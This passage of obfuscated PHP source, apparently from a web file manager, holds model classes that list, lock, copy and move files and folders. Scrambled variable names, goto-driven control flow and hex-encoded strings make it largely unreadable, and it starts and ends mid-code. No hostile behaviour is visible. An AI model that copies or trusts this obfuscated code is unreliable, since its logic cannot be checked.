(isset($FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]]) && $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]][$fÜõÏˆ†Œô[491]]) { $bŠ°†ŒöÚ = $GLOBALS[$fÜõÏˆ†Œô[6]][$fÜõÏˆ†Œô[94]][$fÜõÏˆ†Œô[492]]; if ($FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]][$fÜõÏˆ†Œô[493]] <= time() - $bŠ°†ŒöÚ) { $this->metaSet($FÀ¾ãôÅêê[$fÜõÏˆ†Œô[381]], $fÜõÏˆ†Œô[491], null); $this->metaSet($FÀ¾ãôÅêê[$fÜõÏˆ†Œô[381]], $fÜõÏˆ†Œô[493], null); unset($FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]][$fÜõÏˆ†Œô[491]]); continue; } $EÆ¢ ÚêÊ = $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]][$fÜõÏˆ†Œô[491]]; $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[429]][$fÜõÏˆ†Œô[494]] = Model($fÜõÏˆ†Œô[490])->getInfoSimpleOuter($EÆ¢ ÚêÊ); } } goto aèËŞùËšİ; aèËŞùËšİ: unset($FÀ¾ãôÅêê); goto D…³½¾’Œó; CÌšíèá¡: $fÜõÏˆ†Œô =& $_SERVER[¨¤¼…´]; $fìÏ‹ªíà = array_to_keyvalue($f ø”çéÄì, $fÜõÏˆ†Œô[43], $fÜõÏˆ†Œô[390]); $f¨Š–øïëÀ = array_to_keyvalue($f ø”çéÄì, $fÜõÏˆ†Œô[43], $fÜõÏˆ†Œô[391]); goto aÛôÃ”öˆæ; D…³½¾’Œó: } public function parentLevelArray($C²Èãäù“ö) { $CƒÕ­¾²¨° =& $_SERVER[¨¤¼…´]; $C²Èãäù“ö = explode($CƒÕ­¾²¨°[57], trim($C²Èãäù“ö, $CƒÕ­¾²¨°[57])); return array_remove_value($C²Èãäù“ö, $CƒÕ­¾²¨°[481]); } public function listAll($B‘ŸùäàÖ¸) { goto b´Ì¦ŠôÄ§; eË¿Á¢ŒÂâ: $D‘‡®é²¾ = array_to_keyvalue($D‘‡®é²¾, $B§¢ì–Ô‡»[381]); $Fí§à‹ = "\57{$E”Şîâ®È[$B§¢ì–Ô‡»[38]]}\57"; $Fí§à‹ = $Fí§à‹ == $B§¢ì–Ô‡»[480] ? $B§¢ì–Ô‡»[8] : $Fí§à‹; goto fÁ×ÌÃ…Î³; b´Ì¦ŠôÄ§: $B§¢ì–Ô‡» =& $_SERVER[¨¤¼…´]; $E”Şîâ®È = $this->sourceInfo($B‘ŸùäàÖ¸); $c…îİÂ¡Å = array($B§¢ì–Ô‡»[495] => array($B§¢ì–Ô‡»[496], $E”Şîâ®È[$B§¢ì–Ô‡»[472]] . $B‘ŸùäàÖ¸ . $B§¢ì–Ô‡»[497]), $B§¢ì–Ô‡»[498] => 0); goto e˜¾ÒÒø¢¯; C¼Î—Š£ã: $this->_listAppendAuth($D‘‡®é²¾); $this->_listAppendUser($D‘‡®é²¾); $this->_listAppendPath($D‘‡®é²¾); goto eË¿Á¢ŒÂâ; e˜¾ÒÒø¢¯: $FÖµ»êÑˆ– = $B§¢ì–Ô‡»[499]; $a¿¸÷¶³Ø = "\x4c\x45\x46\x54\x20\112\117\111\116\40{$this->tablePrefix}\151\157\x5f\x66\x69\154\145\40\146\x69\154\x65\x20\x6f\x6e\x20\163\x6f\165\x72\143\145\56\146\x69\x6c\x65\x49\104\40\x3d\40\146\151\x6c\145\x2e\146\x69\x6c\145\111\x44"; $D‘‡®é²¾ = $this->alias($B§¢ì–Ô‡»[500])->field($FÖµ»êÑˆ–)->where($c…îİÂ¡Å)->join($a¿¸÷¶³Ø)->select(); goto C¼Î—Š£ã; fÁ×ÌÃ…Î³: $D÷èë†ßß› = array(); foreach ($D‘‡®é²¾ as $b§ÏÚÜ„ê => $AâÈ¡àÒÃ) { goto Fí…ÚïÑµš; Fí…ÚïÑµš: $Aµ¸Ûë¬‹§ = $this->parentLevelArray($AâÈ¡àÒÃ[$B§¢ì–Ô‡»[472]]); array_shift($Aµ¸Ûë¬‹§); $e¨õ—Ì…¶— = $Fí§à‹; goto eèŒî¥²ÙÓ; d§£‡‰Í…: $e¨õ—Ì…¶— = str_replace($B§¢ì–Ô‡»[480], $B§¢ì–Ô‡»[8], $e¨õ—Ì…¶—); $e¨õ—Ì…¶— = str_replace($B§¢ì–Ô‡»[480], $B§¢ì–Ô‡»[8], $e¨õ—Ì…¶—); $a¡¶šæ¶¼… = array($B§¢ì–Ô‡»[399] => str_replace($B§¢ì–Ô‡»[480], $B§¢ì–Ô‡»[8], $e¨õ—Ì…¶—), $B§¢ì–Ô‡»[501] => intval($AâÈ¡àÒÃ[$B§¢ì–Ô‡»[382]]), $B§¢ì–Ô‡»[403] => $this->pathInfoFilter($AâÈ¡àÒÃ, !0)); goto f ¦Íˆˆø; eèŒî¥²ÙÓ: for ($A©‚“êÈİã = 0; $A©‚“êÈİã < count($Aµ¸Ûë¬‹§); $A©‚“êÈİã++) { $e¨õ—Ì…¶— .= $D‘‡®é²¾[$Aµ¸Ûë¬‹§[$A©‚“êÈİã]][$B§¢ì–Ô‡»[38]] . $B§¢ì–Ô‡»[8]; } $e¨õ—Ì…¶— .= $AâÈ¡àÒÃ[$B§¢ì–Ô‡»[38]]; if ($AâÈ¡àÒÃ[$B§¢ì–Ô‡»[382]]) { $e¨õ—Ì…¶— .= $B§¢ì–Ô‡»[8]; } goto d§£‡‰Í…; f ¦Íˆˆø: if (!$AâÈ¡àÒÃ[$B§¢ì–Ô‡»[382]]) { $a¡¶šæ¶¼…[$B§¢ì–Ô‡»[431]] = $AâÈ¡àÒÃ[$B§¢ì–Ô‡»[431]]; $a¡¶šæ¶¼…[$B§¢ì–Ô‡»[502]] = $AâÈ¡àÒÃ[$B§¢ì–Ô‡»[85]]; } $D÷èë†ßß›[] = $a¡¶šæ¶¼…; goto dÕ–ŞĞ®÷; dÕ–ŞĞ®÷: } return $D÷èë†ßß›; goto B½Öˆ½ê¸; B½Öˆ½ê¸: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($AÔá¨ã³») { goto E©ïÛÅ¬‹Š; fáÑÏ–İŸ: $bÛé¹Ì¡‰ = 1; $this->_lockEvent($AÔá¨ã³», array($b•¿×´–ƒ¦[504], $b•¿×´–ƒ¦[505]), $bÛé¹Ì¡‰); $this->_lockParent($AÔá¨ã³», array($b•¿×´–ƒ¦[505]), $bÛé¹Ì¡‰); goto cÃ¬°œä¬‹; E©ïÛÅ¬‹Š: $b•¿×´–ƒ¦ =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $this->_lockCheck($b•¿×´–ƒ¦[503], $AÔá¨ã³»); goto fáÑÏ–İŸ; cÃ¬°œä¬‹: $this->_lockEvent($AÔá¨ã³», array($b•¿×´–ƒ¦[506], $b•¿×´–ƒ¦[507]), $bÛé¹Ì¡‰); $this->_lockCheckEnd($b•¿×´–ƒ¦[503], $AÔá¨ã³»); goto Dá¬‡Üòãö; Dá¬‡Üòãö: } public function lockCopyEnd($e‹×âá»½) { $c×éà»†‹“ =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $A›ß¬ó¥ğõ = 0; $this->_lockEvent($e‹×âá»½, array($c×éà»†‹“[504], $c×éà»†‹“[505]), $A›ß¬ó¥ğõ); $this->_lockParent($e‹×âá»½, array($c×éà»†‹“[505]), $A›ß¬ó¥ğõ); $this->_lockEvent($e‹×âá»½, array($c×éà»†‹“[506], $c×éà»†‹“[507]), $A›ß¬ó¥ğõ); } public function lockWriteStart($Càê¸ŠáÒ, $A¿•À¥âñĞ = '') { goto D¶„»¡é‡Í; b²™Ÿ˜¾ª˜: $Fç Š³×Ìƒ = 1; $this->_lockKey($F»‹ˆš¥«Ò[508] . $Càê¸ŠáÒ . $F»‹ˆš¥«Ò[101] . $A¿•À¥âñĞ, $Fç Š³×Ìƒ); $this->_lockEvent($Càê¸ŠáÒ, array($F»‹ˆš¥«Ò[503], $F»‹ˆš¥«Ò[505]), $Fç Š³×Ìƒ); goto DµÏÖíĞÖ’; DµÏÖíĞÖ’: $this->_lockParent($Càê¸ŠáÒ, array($F»‹ˆš¥«Ò[503], $F»‹ˆš¥«Ò[505]), $Fç Š³×Ìƒ); $this->_lockCheckEnd($F»‹ˆš¥«Ò[504], $Càê¸ŠáÒ); goto aˆØÈ›Æ—‹; D¶„»¡é‡Í: $F»‹ˆš¥«Ò =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $this->_lockCheck($F»‹ˆš¥«Ò[504], $Càê¸ŠáÒ); goto b²™Ÿ˜¾ª˜; aˆØÈ›Æ—‹: } public function lockWriteEnd($cÌºòÎÖòß, $A–÷§°Şöæ = '') { $e‰Ê±é…æ =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $aŸ«Şï’Ù› = 0; $this->_lockKey($e‰Ê±é…æ[508] . $cÌºòÎÖòß . $e‰Ê±é…æ[101] . $A–÷§°Şöæ, $aŸ«Şï’Ù›); $this->_lockEvent($cÌºòÎÖòß, array($e‰Ê±é…æ[503], $e‰Ê±é…æ[505]), $aŸ«Şï’Ù›); $this->_lockParent($cÌºòÎÖòß, array($e‰Ê±é…æ[503], $e‰Ê±é…æ[505]), $aŸ«Şï’Ù›); } public function lockMoveStart($aˆÁø·áäÇ) { goto b¯‘è˜ğß…; eŒå¶ôŠØÚ: $bŸÈ³Ìä• = 1; $this->_lockKey($aè™†Î†Êä[509] . $aˆÁø·áäÇ, $bŸÈ³Ìä•); $this->_lockEvent($aˆÁø·áäÇ, array($aè™†Î†Êä[503], $aè™†Î†Êä[504]), $bŸÈ³Ìä•); goto CòÔ£¡¸øŠ; CòÔ£¡¸øŠ: $this->_lockParent($aˆÁø·áäÇ, array($aè™†Î†Êä[503], $aè™†Î†Êä[505]), $bŸÈ³Ìä•); $this->_lockEvent($aˆÁø·áäÇ, array($aè™†Î†Êä[510], $aè™†Î†Êä[506], $aè™†Î†Êä[507]), $bŸÈ³Ìä•); $this->_lockCheckEnd($aè™†Î†Êä[505], $aˆÁø·áäÇ); goto a…ëÛ¡ÏÓ—; b¯‘è˜ğß…: $aè™†Î†Êä =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $this->_lockCheck($aè™†Î†Êä[505], $aˆÁø·áäÇ); goto eŒå¶ôŠØÚ; a…ëÛ¡ÏÓ—: } public function lockMoveEnd($B¸”Ñ´„Áö) { goto E÷Õ‡²»–º; E÷Õ‡²»–º: $fõâ¬ƒ±µ =& $_SERVER[¨¤¼…´]; if (!$this->allowLock()) { return; } $AËŞÉÀù¼æ = 0; goto CÀóõ›à¯ù; CÀóõ›à¯ù: $this->_lockKey($fõâ¬ƒ±µ[509] . $B¸”Ñ´„Áö, $AËŞÉÀù¼æ); $this->_lockEvent($B¸”Ñ´„Áö, array($fõâ¬ƒ±µ[503], $fõâ¬ƒ±µ[504]), $AËŞÉÀù¼æ); $this->_lockParent($B¸”Ñ´„Áö, array($fõâ¬ƒ±µ[503], $fõâ¬ƒ±µ[505]), $AËŞÉÀù¼æ); goto fÉâ†ÇÃÂ¤; fÉâ†ÇÃÂ¤: $this->_lockEvent($B¸”Ñ´„Áö, array($fõâ¬ƒ±µ[510], $fõâ¬ƒ±µ[506], $fõâ¬ƒ±µ[507]), $AËŞÉÀù¼æ); goto f·Å•ˆÅù; f·Å•ˆÅù: } private function _lockCheck($B¬ÜÕ„ç•Á, $AÂÎ‚Òİ°Á) { goto DßÒÂÄ·Ãö; Aƒ¸Øíº¬: CacheLock::setErrorMsg($f‘Åå–èÚË[167] . htmlspecialchars($DòÌ²¹‹³[$f‘Åå–èÚË[38]]) . $f‘Åå–èÚË[489] . $cÆ’Œ¿“Ò); $this->_lockKey($Eåù‹ÉÈµ, 1); $this->_lockKey($Eåù‹ÉÈµ, 0); goto b“ŞàÆÀ; DßÒÂÄ·Ãö: $f‘Åå–èÚË =& $_SERVER[¨¤¼…´]; $DòÌ²¹‹³ = $this->sourceInfo($AÂÎ‚Òİ°Á); $Eåù‹ÉÈµ = $B¬ÜÕ„ç•Á . $f‘Åå–èÚË[101] . $AÂÎ‚Òİ°Á; goto AÃÄÉ±ô§; AÃÄÉ±ô§: $this->_lockTimeStart[$Eåù‹ÉÈµ] = timeFloat(); if (!is_array($DòÌ²¹‹³)) { return; } $cÆ’Œ¿“Ò = LNG($f‘Åå–èÚË[511]); goto Aƒ¸Øíº¬; b“ŞàÆÀ: $E¼Øê¸˜Å« = array_reverse($this->parentLevelArray($DòÌ²¹‹³[$f‘Åå–èÚË[472]])); foreach ($E¼Øê¸˜Å« as $CŠá¯µ³¥Æ) { $Eåù‹ÉÈµ = $B¬ÜÕ„ç•Á . $f‘Åå–èÚË[512] . $CŠá¯µ³¥Æ; if (CacheLock::lockGet($f‘Åå–èÚË[513] . $Eåù‹ÉÈµ)) { $DòÌ²¹‹³ = $this->sourceInfo($CŠá¯µ³¥Æ); CacheLock::setErrorMsg($f‘Åå–èÚË[167] . htmlspecialchars($DòÌ²¹‹³[$f‘Åå–èÚË[38]]) . $f‘Åå–èÚË[489] . $cÆ’Œ¿“Ò); $this->_lockKey($Eåù‹ÉÈµ, 1); $this->_lockKey($Eåù‹ÉÈµ, 0); } } goto eŞ³”¸ç¹¦; eŞ³”¸ç¹¦: } private function _lockCheckEnd($DğÀˆÊïï, $e³Ç‡… Ë) { goto eÏ»Ğè ³; eƒ¥ø Ñ×: if (!isset($this->_lockTimeStart[$B˜”ª¸Â‹])) { return; } $aÏš‡‘»£• = timeFloat() - $this->_lockTimeStart[$B˜”ª¸Â‹]; unset($this->_lockTimeStart[$B˜”ª¸Â‹]); goto d‘éò¶í¢¡; eÏ»Ğè ³: $EÛÆ¦Íï Ö =& $_SERVER[¨¤¼…´]; $B˜”ª¸Â‹ = $DğÀˆÊïï . $EÛÆ¦Íï Ö[101] . $e³Ç‡… Ë; CacheLock::setErrorMsg($EÛÆ¦Íï Ö[18]); goto eƒ¥ø Ñ×; d‘éò¶í¢¡: if ($aÏš‡‘»£• > 0.5) { unset(self::$cacheSourceInfo[$EÛÆ¦Íï Ö[422] . $e³Ç‡… Ë]); } $d¼½ïÃ¹‡½ = $this->sourceInfo($e³Ç‡… Ë); if (!$d¼½ïÃ¹‡½) { show_json(LNG($EÛÆ¦Íï Ö[111]), !1); } goto eÕóæ¼í…¼; eÕóæ¼í…¼: } private function _lockParent($fÖ¾—íÎ¢Î, $e÷ØË°º´æ, $E­ä«—¡¢) { if (!$this->autoLockSet) { return; } $C×²ŞêÃèå = $this->sourceInfo($fÖ¾—íÎ¢Î); if (!is_array($C×²ŞêÃèå)) { return; } $Dèäí£’ Ë = array_reverse($this->parentLevelArray($C×²ŞêÃèå[$_SERVER[¨¤¼…´][472]])); foreach ($Dèäí£’ Ë as $C©‰…„¡Ş…) { $this->_lockEvent($C©‰…„¡Ş…, $e÷ØË°º´æ, $E­ä«—¡¢); } } private function _lockEvent($d¶Œ–ÊŞá„, $dÖÎÀç˜¾¦, $D›æò«îÅ) { $EÆö¹»¡âÓ =& $_SERVER[¨¤¼…´]; if (!$this->autoLockSet) { return; } foreach ($dÖÎÀç˜¾¦ as $dã¬—›ëˆ) { $aİÅãíÙÜ = $dã¬—›ëˆ . $EÆö¹»¡âÓ[101] . $d¶Œ–ÊŞá„; if ($D›æò«îÅ && CacheLock::lockGet($EÆö¹»¡âÓ[513] . $aİÅãíÙÜ)) { continue; } $this->_lockKey($aİÅãíÙÜ, $D›æò«îÅ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bŞ¦‚™ÛœŒ, $A™á÷©«ô = 1) { $fÍÜÅÚŒ¯ = $_SERVER[¨¤¼…´][513] . md5($bŞ¦‚™ÛœŒ); if ($A™á÷©«ô) { if (isset(self::$_lockItemArr[$fÍÜÅÚŒ¯])) { return; } self::$_lockItemArr[$fÍÜÅÚŒ¯] = 1; CacheLock::lock($fÍÜÅÚŒ¯, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$fÍÜÅÚŒ¯])) { return; } unset(self::$_lockItemArr[$fÍÜÅÚŒ¯]); CacheLock::unlock($fÍÜÅÚŒ¯); } } public function isParentOf($dÑ›¥‘Ï, $F˜¡–Äî…ƒ) { goto CºŒ•ÚÆ¢; dèÓàŞš˜â: $e„‘Ö»ìõ¥ = $E¼Šêä‡ˆ[$dî¦¾÷öŠï[472]] . $E¼Šêä‡ˆ[$dî¦¾÷öŠï[381]] . $dî¦¾÷öŠï[57]; $F²Ö–ëŒ = $f¯ˆ¨‚Ï¶[$dî¦¾÷öŠï[472]] . $f¯ˆ¨‚Ï¶[$dî¦¾÷öŠï[381]] . $dî¦¾÷öŠï[57]; $B¥ò² «ƒÃ = strpos($F²Ö–ëŒ, $e„‘Ö»ìõ¥) === 0; goto bó±Èä—ôƒ; bó±Èä—ôƒ: return $B¥ò² «ƒÃ; goto AÜ²ìŒ¼¢ì; CºŒ•ÚÆ¢: $dî¦¾÷öŠï =& $_SERVER[¨¤¼…´]; $E¼Šêä‡ˆ = $this->sourceInfo($dÑ›¥‘Ï); $f¯ˆ¨‚Ï¶ = $this->sourceInfo($F˜¡–Äî…ƒ); goto dèÓàŞš˜â; AÜ²ìŒ¼¢ì: } private $targetIsDelete = 0; public function copy($a§å‡ùì‹¹, $bË¤¾ö Û, $bâ¶Í–¢°² = REPEAT_REPLACE, $bˆ‰ÁÛáªº = '') { goto Fç´ƒ„¬øŠ; cåã˜ãîô¼: $this->_childrenListClear(); $this->lockCopyEnd($a§å‡ùì‹¹); $this->lockWriteEnd($bË¤¾ö Û, $f™íÜÖ¡ÈÌ); goto aÎÁã…Äøß; DÌâÈ‘ñ½Ğ: $this->lockCopyStart($a§å‡ùì‹¹); $this->lockWriteStart($bË¤¾ö Û, $f™íÜÖ¡ÈÌ); $d’‚Õèî–· = array($b£§á‘¤º¡[514] => array(), $b£§á‘¤º¡[515] => array(), $b£§á‘¤º¡[516] => array()); goto b¾ÌŠæ‡ŸÄ; Fç´ƒ„¬øŠ: $b£§á‘¤º¡ =& $_SERVER[¨¤¼…´]; $dÏ÷¼ã„ÁÍ = $this->sourceInfo($a§å‡ùì‹¹); $bÜñ¢ÚŞö§ = $this->sourceInfo($bË¤¾ö Û); goto Aª¶ÎËŞ¸¨; DØ¦»ì¥Ô: $this->updateModifyTime($bË¤¾ö Û); return $AŒ¾¹‹ÖÒ×; goto bÜ»Ñ‡ ‡; Aª¶ÎËŞ¸¨: if (!$dÏ÷¼ã„ÁÍ || !$bÜñ¢ÚŞö§ || $bÜñ¢ÚŞö§[$b£§á‘¤º¡[382]] != $b£§á‘¤º¡[93]) { return !1; } if ($this->isParentOf($a§å‡ùì‹¹, $bË¤¾ö Û)) { return !1; } $f™íÜÖ¡ÈÌ = $bˆ‰ÁÛáªº ? $bˆ‰ÁÛáªº : $dÏ÷¼ã„ÁÍ[$b£§á‘¤º¡[38]]; goto DÌâÈ‘ñ½Ğ; b¾ÌŠæ‡ŸÄ: $this->targetIsDelete = intval($dÏ÷¼ã„ÁÍ[$b£§á‘¤º¡[409]]); $Aá¬îÇèš¾ = $this->fileNameExistCache($bË¤¾ö Û, $dÏ÷¼ã„ÁÍ[$b£§á‘¤º¡[38]]); $AŒ¾¹‹ÖÒ× = $this->_copy($a§å‡ùì‹¹, $bË¤¾ö Û, $bâ¶Í–¢°², $d’‚Õèî–·, !0, $bˆ‰ÁÛáªº); goto cåã˜ãîô¼; FÓ‚³óáô: $this->saveAll($d’‚Õèî–·[$b£§á‘¤º¡[516]]); Model($b£§á‘¤º¡[181])->linkAdd($d’‚Õèî–·[$b£§á‘¤º¡[514]]); $this->folderSizeReset($bË¤¾ö Û); goto DØ¦»ì¥Ô; aÎÁã…Äøß: if ($dÏ÷¼ã„ÁÍ[$b£§á‘¤º¡[382]] == $b£§á‘¤º¡[93] && $Aá¬îÇèš¾ == $AŒ¾¹‹ÖÒ×) { $this->folderSizeResetChildren($Aá¬îÇèš¾); } Model($b£§á‘¤º¡[517])->addAll($d’‚Õèî–·[$b£§á‘¤º¡[515]], array(), !0); if ($Aá¬îÇèš¾ != $AŒ¾¹‹ÖÒ× || $dÏ÷¼ã„ÁÍ[$b£§á‘¤º¡[382]] == $b£§á‘¤º¡[93]) { Model($b£§á‘¤º¡[518])->eventCopy($AŒ¾¹‹ÖÒ×); } goto FÓ‚³óáô; bÜ»Ñ‡ ‡: } private function _copy($dÃ±¬‹‹ø¤, $fÍ Ò’âÑÊ, $B¿Ê¨ÛˆÃ’, &$DÔÅ©Ù·ôÇ, $cğ÷·É¾, $Dâçìïë¯ = '') { goto Fõ›äŠà§È; f—Øäº™: $Cˆ¾¦ ¯Ñ¿ = $Dâçìïë¯ ? $Dâçìïë¯ : $dãÍ¯à¨ÇÊ[$F”ìÉñ‚‡[38]]; $dÏ“±„ÙŞ” = $this->fileNameExistCache($fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿); if ($cğ÷·É¾) { $this->_childrenAllMake($dÃ±¬‹‹ø¤); if ($eÆï«ùã´ && $dÏ“±„ÙŞ”) { $this->_childrenAllMake($dÏ“±„ÙŞ”); } } goto D–ÌŸÚ©‡; D–ÌŸÚ©‡: if (!$dÏ“±„ÙŞ”) { return $this->_copyCreate($dÃ±¬‹‹ø¤, $fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿, $DÔÅ©Ù·ôÇ); } $bªÍ¦—ãà² = $dÏ“±„ÙŞ”; if ($eÆï«ùã´) { if ($B¿Ê¨ÛˆÃ’ == REPEAT_RENAME_FOLDER) { $Cˆ¾¦ ¯Ñ¿ = $this->fileNameAutoCache($fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿, $B¿Ê¨ÛˆÃ’, $eÆï«ùã´); $bªÍ¦—ãà² = $this->_copyCreate($dÃ±¬‹‹ø¤, $fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿, $DÔÅ©Ù·ôÇ); } else { $d¢µ‡ìÂá³ = $this->_childrenList($dÃ±¬‹‹ø¤); foreach ($d¢µ‡ìÂá³ as $aùÃœÆíìµ) { $this->_copy($aùÃœÆíìµ[$F”ìÉñ‚‡[381]], $dÏ“±„ÙŞ”, $B¿Ê¨ÛˆÃ’, $DÔÅ©Ù·ôÇ, !1); } } } else { if ($B¿Ê¨ÛˆÃ’ == REPEAT_RENAME || $B¿Ê¨ÛˆÃ’ == REPEAT_RENAME_FOLDER) { $Cˆ¾¦ ¯Ñ¿ = $this->fileNameAutoCache($fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿, $B¿Ê¨ÛˆÃ’, $eÆï«ùã´); $bªÍ¦—ãà² = $this->_copyCreate($dÃ±¬‹‹ø¤, $fÍ Ò’âÑÊ, $Cˆ¾¦ ¯Ñ¿, $DÔÅ©Ù·ôÇ); } else { if ($B¿Ê¨ÛˆÃ’ == REPEAT_REPLACE) { $BÒøàŞ„ÔÍ = $this->sourceInfoCache($dÏ“±„ÙŞ”); $dãßâŠİ¯¡ = $this->fileHistory($BÒøàŞ„ÔÍ, $dãÍ¯à¨ÇÊ[$F”ìÉñ‚‡[431]], $dãÍ¯à¨ÇÊ[$F”ìÉñ‚‡[87]]); if ($dãßâŠİ¯¡) { $DÔÅ©Ù·ôÇ[$F”ìÉñ‚‡[514]][] = $dãÍ¯à¨ÇÊ[$F”ìÉñ‚‡[431]]; } } else { if ($B¿Ê¨ÛˆÃ’ == REPEAT_SKIP) { } } } Hook::trigger($F”ìÉñ‚‡[519], array($F”ìÉñ‚‡[520], $dãÍ¯à¨ÇÊ, 0)); } goto fĞŠ‰Í˜”; Fõ›äŠà§È: $F”ìÉñ‚‡ =& $_SERVER[¨¤¼…´]; $dãÍ¯à¨ÇÊ = $this->sourceInfoCache($dÃ±¬‹‹ø¤); $eÆï«ùã´ = $dãÍ¯à¨ÇÊ[$F”ìÉñ‚‡[382]] == $F”ìÉñ‚‡[93]; goto f—Øäº™; fĞŠ‰Í˜”: return $bªÍ¦—ãà²; goto B…¹„ÔË¿Î; B…¹„ÔË¿Î: } private function _copyCreate($AÇŞ¼Íº“À, $C†ÕŸ˜è“ó, $Eà‰’ó’«ê, &$fË‡»šÆïœ) { goto eŠÒáñíÛÓ; a®ïæº“ÇÙ: $aÃ‚ñøéÂŒ = $this->add($E…áÌ·èĞ…); $d‡¢ÚÊ‚é† = array($aÁÀŒÍ©ƒ[381] => $aÃ‚ñøéÂŒ, $aÁÀŒÍ©ƒ[38] => $Eà‰’ó’«ê); $this->_copyApplyMeta($d‡¢ÚÊ‚é†, $fË‡»šÆïœ); goto FÀ´¼±­‰±; FÀ´¼±­‰±: if ($cÚŞ¢ÄÅ†¥[$aÁÀŒÍ©ƒ[382]] != $aÁÀŒÍ©ƒ[93]) { $fË‡»šÆïœ[$aÁÀŒÍ©ƒ[514]][] = $cÚŞ¢ÄÅ†¥[$aÁÀŒÍ©ƒ[431]]; return $aÃ‚ñøéÂŒ; } $Aùñ˜˜®í¨ = array(); $b¾‚ƒğ×í¼ = array(); goto A—×Ã–Ï•; eŠÒáñíÛÓ: $aÁÀŒÍ©ƒ =& $_SERVER[¨¤¼…´]; $cÚŞ¢ÄÅ†¥ = $this->sourceInfoCache($AÇŞ¼Íº“À); $FÀŞŒ¬¶» = $this->sourceInfoCache($C†ÕŸ˜è“ó); goto FÕ·³œøá; B¨®°’š²˜: foreach ($Fä·È†ªò¶ as $bè…ç—¥ÁÃ) { $fœòÕ§ ­ = $bè…ç—¥ÁÃ[$aÁÀŒÍ©ƒ[381]]; $F„‘Ú¥ Ê˜ = $this->_childrenMatch($D¡Ë–ÅŠĞ¤, $bè…ç—¥ÁÃ, $B£†Ó£”ÀÒ); $BíêÒ£Öè¢[] = array($aÁÀŒÍ©ƒ[381], $fœòÕ§ ­, $aÁÀŒÍ©ƒ[474], $F„‘Ú¥ Ê˜[$aÁÀŒÍ©ƒ[474]]); $B¤…Úá³ë†[] = array($aÁÀŒÍ©ƒ[381], $fœòÕ§ ­, $aÁÀŒÍ©ƒ[472], $F„‘Ú¥ Ê˜[$aÁÀŒÍ©ƒ[472]]); $this->_copyApplyMeta($bè…ç—¥ÁÃ, $fË‡»šÆïœ); if ($bè…ç—¥ÁÃ[$aÁÀŒÍ©ƒ[382]] != $aÁÀŒÍ©ƒ[93]) { $fË‡»šÆïœ[$aÁÀŒÍ©ƒ[514]][] = $bè…ç—¥ÁÃ[$aÁÀŒÍ©ƒ[431]]; } } $this->chunkEventSet($aÁÀŒÍ©ƒ[526], array($aÁÀŒÍ©ƒ[527], $E…áÌ·èĞ…, $eÓŞ«ì–˜©)); $this->saveAll($BíêÒ£Öè¢); goto b°„–è¯À’; C¯ƒæ‰ÛÆÉ: $this->addAll($b¾‚ƒğ×í¼, array(), !1); $Fä·È†ªò¶ = $this->where(array($aÁÀŒÍ©ƒ[474] => $aÃ‚ñøéÂŒ))->select(); $D¡Ë–ÅŠĞ¤ = $this->_childrenMakeRelation($Aùñ˜˜®í¨, $Fä·È†ªò¶); goto c¸»µØçö¦; dßŠô¹œøÖ: $B£†Ó£”ÀÒ = $this->sourceInfo($aÃ‚ñøéÂŒ); foreach ($Aùñ˜˜®í¨ as $bè…ç—¥ÁÃ) { $E…»ƒáÈç“ = $this->_makeItemData($bè…ç—¥ÁÃ, $B£†Ó£”ÀÒ, $bè…ç—¥ÁÃ[$aÁÀŒÍ©ƒ[38]]); $E…»ƒáÈç“[$aÁÀŒÍ©ƒ[472]] = $bè…ç—¥ÁÃ[$aÁÀŒÍ©ƒ[472]]; $b¾‚ƒğ×í¼[] = $E…»ƒáÈç“; } $this->chunkEventSet($aÁÀŒÍ©ƒ[524], array($aÁÀŒÍ©ƒ[525], $E…áÌ·èĞ…, $eÓŞ«ì–˜©)); goto C¯ƒæ‰ÛÆÉ; c¸»µØçö¦: $D¡Ë–ÅŠĞ¤[$AÇŞ¼Íº“À] = $aÃ‚ñøéÂŒ; $BíêÒ£Öè¢ = array(); $B¤…Úá³ë† = array(); goto B¨®°’š²˜; b°„–è¯À’: $this->chunkEventSet($aÁÀŒÍ©ƒ[528], array($aÁÀŒÍ©ƒ[529], $E…áÌ·èĞ…, $eÓŞ«ì–˜©)); $this->saveAll($B¤…Úá³ë†); return $aÃ‚ñøéÂŒ; goto C¸˜ËŒÎİŸ; A—×Ã–Ï•: $this->_childrenListAll($AÇŞ¼Íº“À, $Aùñ˜˜®í¨); $eÓŞ«ì–˜© = count($Aùñ˜˜®í¨); if ($eÓŞ«ì–˜© == 0) { return $aÃ‚ñøéÂŒ; } goto dßŠô¹œøÖ; FÕ·³œøá: $E…áÌ·èĞ… = $this->_makeItemData($cÚŞ¢ÄÅ†¥, $FÀŞŒ¬¶», $Eà‰’ó’«ê); Hook::trigger($aÁÀŒÍ©ƒ[521], $E…áÌ·èĞ…); Hook::trigger($aÁÀŒÍ©ƒ[522], array($aÁÀŒÍ©ƒ[523], $E…áÌ·èĞ…, 0)); goto a®ïæº“ÇÙ; C¸˜ËŒÎİŸ: } private function _childrenMakeRelation($Fœ†›™Ûä—, $b‡øª¥îÓÉ) { $BÌ“ªÈº²à =& $_SERVER[¨¤¼…´]; $a—¸»­°Â² = array(); $aŸÀ‘¯‡‹Œ = array(); foreach ($Fœ†›™Ûä— as $A£ÂÏÊµé›) { $a‘¡íÇ¤’Ä = $A£ÂÏÊµé›[$BÌ“ªÈº²à[38]] . $BÌ“ªÈº²à[8] . 